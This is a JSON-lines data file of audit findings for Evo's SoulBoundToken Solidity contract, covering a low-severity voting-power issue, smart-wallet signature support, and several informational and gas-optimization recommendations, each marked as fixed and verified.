{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-004", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 4, "page_start": null, "title": "Whale can buy near-infinite voting power via `mintWithTerms`", "short_summary": null, "description_md": null, "full_markdown": "### Whale can buy near-infinite voting power via `mintWithTerms`\n\n**Description:** Since whales can control near-infinite addresses, as long as they have the funds they can buy near-infinite voting power via `mintWithTerms`.\n\n**Impact:** This could be used seconds before a proposal is due to expire to decide that proposal. Long-term impact is limited however since the admins can blacklist addresses which burn the NFTs.\n\n**Recommended Mitigation:** Implement a snapshot mechanism to capture total and individual user voting power prior to proposals. Consider implementing pausing to prevent users from minting NFTs via `mintWithTerms` since this is the only function which allows \"unlimited mints\".\n\n**Evo:**\nFixed in commit [2fbd2c5](https://github.com/contractlevel/sbt/commit/2fbd2c5379a5f07a8166ec4041f392d867f5bedd) by allowing admins to pause `mintWithTerms`.\n\n**Cyfrin:** Verified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-005", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 5, "page_start": null, "title": "`_verifySignature` is not compatible with smart contract wallets or other smart accounts", "short_summary": null, "description_md": null, "full_markdown": "### `_verifySignature` is not compatible with smart contract wallets or other smart accounts\n\n**Description:** Support for smart accounts (e.g. [ERC-4337](https://eips.ethereum.org/EIPS/eip-4337)) and other smart contract wallets (e.g. Safe{Wallet}) minting tokens is not currently possible as the signature verification implemented in `_verifySignature` is only able to handle those generated by EOAs. Here, it could be beneficial to support signature verification not just for smart accounts but also other smart contracts that could include multi-sig wallets or any other use case, for example DAOs with their own smart contract infrastructure, to allow other organizations to participate as members.\n\nEOAs upgraded to [ERC-7702](https://eips.ethereum.org/EIPS/eip-7702) accounts are unaffected, but any other smart contract signatures cannot be verified without implementing [ERC-1271](https://eips.ethereum.org/EIPS/eip-1271). However, this adds the additional consideration that for EIP-7702 accounts the code length will be non-zero, so while these accounts can have their signatures verified using EIP-1271, the private key still holds full authority to sign transactions which means that any implementation of a code length check such as in the [OpenZeppelin SignatureChecker library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/SignatureChecker.sol) will need to be slightly modified to continue to allow verification of signatures from these accounts generated using `eth/personal_sign`. Additional discussion can be found [here](https://blog.rhinestone.wtf/unlocking-chain-abstracted-eoas-with-eip-7702-and-irrevocable-signatures-adc820a150ef).\n\nTo support such smart contract signatures, consider falling back to the OpenZeppelin SignatureChecker library function `isValidERC1271SignatureNow` like so:\n\n```diff\n    function _verifySignature(bytes memory signature) internal view returns (bool) {\n        /// @dev compute the message hash: keccak256(termsHash, msg.sender)\n        bytes32 messageHash = keccak256(abi.encodePacked(s_termsHash, msg.sender));\n\n        /// @dev apply Ethereum signed message prefix\n        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);\n\n        /// @dev attempt to recover the signer\n        //slither-disable-next-line unused-return\n        (address recovered, ECDSA.RecoverError error,) = ECDSA.tryRecover(ethSignedMessageHash, signature);\n\n        /// @dev return false if errors or incorrect signer\n++      if (error == ECDSA.RecoverError.NoError && recovered == msg.sender) return true;\n++      else return SignatureChecker.isValidERC1271SignatureNow(msg.sender, ethSignedMessageHash, signature);\n    }\n```\n\n**Evo:**\nFixed in commit [6d4f41c](https://github.com/contractlevel/sbt/commit/6d4f41ce160e19713bb4a6cafdf1b739df98e027#diff-39790f8feee6ea105eee119137d7c3d881007ed50d9a62590b54ff559f45b27aL511-R514).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-006", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 6, "page_start": null, "title": "Prefer`Ownable2Step` instead of `Ownable`", "short_summary": null, "description_md": null, "full_markdown": "### Prefer`Ownable2Step` instead of `Ownable`\n\n**Description:** Prefer [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) instead of `Ownable` for [safer ownership transfer](https://www.rareskills.io/post/openzeppelin-ownable2step).\n\n**Evo:**\nFixed in commit [620120e](https://github.com/contractlevel/sbt/commit/620120ec5a85c3a2dbd1be52af4ee34fe946efbe).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-007", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 7, "page_start": null, "title": "Assuming Chainlink price feed decimals can lead to unintended errors", "short_summary": null, "description_md": null, "full_markdown": "### Assuming Chainlink price feed decimals can lead to unintended errors\n\n**Description:** In general, Chainlink x/USD price feeds use 8 decimal precision however this is not universally true for example [AMPL/USD](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706#readContract#F3) uses 18 decimal precision.\n\nInstead of [assuming Chainlink oracle price precision](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#87fc), the precision variable could be declared `immutable` and initialized in the constructor via [`AggregatorV3Interface::decimals`](https://docs.chain.link/data-feeds/api-reference#decimals).\n\nIn practice though the price oracle is hard-coded in `script/HelperConfig.s.sol` and does use 8 decimals for on Optimism, so the current configuration will work fine.\n\n**Evo:**\nFixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-008", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 8, "page_start": null, "title": "Don't initialize to default values", "short_summary": null, "description_md": null, "full_markdown": "### Don't initialize to default values\n\n**Description:** Don't initialize to default values as Solidity already does this:\n```solidity\nSoulBoundToken.sol\n125:        for (uint256 i = 0; i < admins.length; ++i) {\n162:        for (uint256 i = 0; i < accounts.length; ++i) {\n226:        for (uint256 i = 0; i < accounts.length; ++i) {\n245:        for (uint256 i = 0; i < accounts.length; ++i) {\n270:        for (uint256 i = 0; i < accounts.length; ++i) {\n289:        for (uint256 i = 0; i < accounts.length; ++i) {\n312:        for (uint256 i = 0; i < accounts.length; ++i) {\n```\n\n**Evo:**\nFixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-009", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 9, "page_start": null, "title": "Remove obsolete `return` statements when already using named returns", "short_summary": null, "description_md": null, "full_markdown": "### Remove obsolete `return` statements when already using named returns\n\n**Description:** Remove obsolete `return` statements when already using named returns:\n```diff\n    function _mintSoulBoundToken(address account) internal returns (uint256 tokenId) {\n        tokenId = _incrementTokenIdCounter(1);\n        _safeMint(account, tokenId);\n-       return tokenId;\n    }\n\n    function _incrementTokenIdCounter(uint256 count) internal returns (uint256 startId) {\n        startId = s_tokenIdCounter;\n        s_tokenIdCounter += count;\n-       return startId;\n    }\n```\n\n**Evo:**\nFixed in commit [f594ae0](https://github.com/contractlevel/sbt/commit/f594ae004d4afc80f19e17c0f61d50caa00a4811).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-010", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 10, "page_start": null, "title": "Consider preventing users from over-paying", "short_summary": null, "description_md": null, "full_markdown": "### Consider preventing users from over-paying\n\n**Description:** Currently the protocol allows users to over-pay:\n```solidity\nfunction _revertIfInsufficientFee() internal view {\n    if (msg.value < _getFee()) revert SoulBoundToken__InsufficientFee();\n}\n```\n\nConsider changing this to require the exact fee to prevent users from accidentally over-paying:\n```solidity\nfunction _revertIfIncorrectFee() internal view {\n    if (msg.value != _getFee()) revert SoulBoundToken__IncorrectFee();\n}\n```\n\n[Fat Finger](https://en.wikipedia.org/wiki/Fat-finger_error) errors have previously resulted in notorious unintended errors in financial markets; the protocol could choose to be defensive and help protect users from themselves.\n\n**Evo:**\nFixed in commit [e3b2f74](https://github.com/contractlevel/sbt/commit/e3b2f74239601b2721118e11aaa92b42dbb502e9).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-011", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 11, "page_start": null, "title": "`else` can be omitted in `mintWithTerms`", "short_summary": null, "description_md": null, "full_markdown": "### `else` can be omitted in `mintWithTerms`\n\n**Description:** `else` can be omitted in `mintWithTerms` since if signature validation failed a revert will occur:\n```diff\n        if (!_verifySignature(signature)) revert SoulBoundToken__InvalidSignature();\n-       else emit SignatureVerified(msg.sender, signature);\n+       emit SignatureVerified(msg.sender, signature);\n        tokenId = _mintSoulBoundToken(msg.sender);\n```\n\n**Evo:**\nFixed in commit [e3b2f74](https://github.com/contractlevel/sbt/commit/e3b2f74239601b2721118e11aaa92b42dbb502e9).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-012", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 12, "page_start": null, "title": "Use named returns where this can eliminate local function variables and for `memory` returns", "short_summary": null, "description_md": null, "full_markdown": "### Use named returns where this can eliminate local function variables and for `memory` returns\n\n**Description:** Using named returns is more gas efficient where this can eliminate local function variables and for `memory` returns:\n```diff\n-   function batchMintAsAdmin(address[] calldata accounts) external onlyAdmin returns (uint256[] memory) {\n+   function batchMintAsAdmin(address[] calldata accounts) external onlyAdmin returns (uint256[] memory tokenIds) {\n        _revertIfEmptyArray(accounts);\n        uint256 startId = _incrementTokenIdCounter(accounts.length);\n\n-      uint256[] memory tokenIds = new uint256[](accounts.length);\n+      tokenIds = new uint256[](accounts.length);\n        for (uint256 i = 0; i < accounts.length; ++i) {\n            _mintAsAdminChecks(accounts[i]);\n            tokenIds[i] = startId + i;\n            _safeMint(accounts[i], tokenIds[i]);\n        }\n-      return tokenIds;\n    }\n```\n\nGas Result:\n```diff\n{\n-  \"batchMintAsAdmin\": \"252114\"\n+  \"batchMintAsAdmin\": \"252102\"\n}\n```\n\n**Evo:**\nFixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-013", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 13, "page_start": null, "title": "Enable the optimizer", "short_summary": null, "description_md": null, "full_markdown": "### Enable the optimizer\n\n**Description:** [Enable the optimizer](https://dacian.me/the-yieldoor-gas-optimizoor#heading-enabling-the-optimizer) in `foundry.toml`.\n\nGas results:\n```diff\n{\n-  \"addToBlacklist\": \"31090\"\n+  \"addToBlacklist\": \"30691\"\n\n-  \"addToWhitelist\": \"28754\"\n+  \"addToWhitelist\": \"28392\"\n\n-  \"batchAddToBlacklist\": \"60282\"\n+  \"batchAddToBlacklist\": \"59482\"\n\n-  \"batchAddToWhitelist\": \"55790\"\n+  \"batchAddToWhitelist\": \"54997\"\n\n-  \"batchMintAsAdmin\": \"252102\"\n+  \"batchMintAsAdmin\": \"248867\"\n\n-  \"batchRemoveFromBlacklist\": \"5289\"\n+  \"batchRemoveFromBlacklist\": \"4594\"\n\n-  \"batchRemoveFromWhitelist\": \"5305\"\n+  \"batchRemoveFromWhitelist\": \"4677\"\n\n-  \"batchSetAdmin\": \"28090\"\n+  \"batchSetAdmin\": \"27412\"\n\n-  \"mintAsAdmin\": \"130754\"\n+  \"mintAsAdmin\": \"129447\"\n\n-  \"mintAsWhitelisted\": \"135623\"\n+  \"mintAsWhitelisted\": \"132292\"\n\n-  \"mintWithTerms\": \"142281\"\n+  \"mintWithTerms\": \"137638\"\n\n-  \"removeFromBlacklist\": \"2516\"\n+  \"removeFromBlacklist\": \"2203\"\n\n-  \"removeFromWhitelist\": \"2634\"\n+  \"removeFromWhitelist\": \"2254\"\n\n-  \"setAdmin\": \"27187\"\n+  \"setAdmin\": \"26677\"\n\n-  \"setContractURI\": \"29118\"\n+  \"setContractURI\": \"26842\"\n\n-  \"setFeeFactor\": \"26075\"\n+  \"setFeeFactor\": \"25666\"\n\n-  \"setWhitelistEnabled\": \"7175\"\n+  \"setWhitelistEnabled\": \"6902\"\n\n-  \"withdrawFees\": \"14114\"\n+  \"withdrawFees\": \"13462\"\n}\n\n```\n\n**Evo:**\nFixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-014", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 14, "page_start": null, "title": "Prefer `calldata` to `memory` for external read-only inputs", "short_summary": null, "description_md": null, "full_markdown": "### Prefer `calldata` to `memory` for external read-only inputs\n\n**Description:** Prefer `calldata` to `memory` for external read-only inputs:\n```diff\n-   function mintWithTerms(bytes memory signature) external payable returns (uint256 tokenId) {\n+   function mintWithTerms(bytes calldata signature) external payable returns (uint256 tokenId) {\n\n-   function _verifySignature(bytes memory signature) internal view returns (bool) {\n+   function _verifySignature(bytes calldata signature) internal view returns (bool) {\n```\n\nGas results:\n```diff\n{\n-  \"mintWithTerms\": \"137638\"\n+  \"mintWithTerms\": \"137299\"\n}\n```\n\n**Evo:**\nFixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-015", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 15, "page_start": null, "title": "Use solady `safeTransferETH` to send eth", "short_summary": null, "description_md": null, "full_markdown": "### Use solady `safeTransferETH` to send eth\n\n**Description:** Using solady [`safeTransferETH`](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L90-L98) is a [more efficient](https://github.com/devdacian/solidity-gas-optimization?tab=readme-ov-file#10-use-safetransferlibsafetransfereth-instead-of-solidity-call-effective-035-cheaper) way to send eth. Also since there is no point in leaving eth inside the contract, consider removing the `amountToWithdraw` input parameter and checks associated with it; instead just send the entire contract balance:\n```solidity\nfunction withdrawFees() external onlyOwner {\n    uint256 amountToWithdraw = address(this).balance;\n    if(amountToWithdraw > 0) {\n        // from https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L90-L98\n        /// @solidity memory-safe-assembly\n        assembly {\n            if iszero(call(gas(), caller(), amountToWithdraw, codesize(), 0x00, codesize(), 0x00)) {\n                mstore(0x00, 0xefde920d) // `SoulBoundToken__WithdrawFailed()`.\n                revert(0x1c, 0x04)\n            }\n        }\n\n        emit FeesWithdrawn(amountToWithdraw);\n    }\n}\n```\n\nGas result:\n```diff\n{\n- \"withdrawFees\": \"13462\"\n+ \"withdrawFees\": \"13353\"\n}\n```\n\n**Evo:**\nFixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
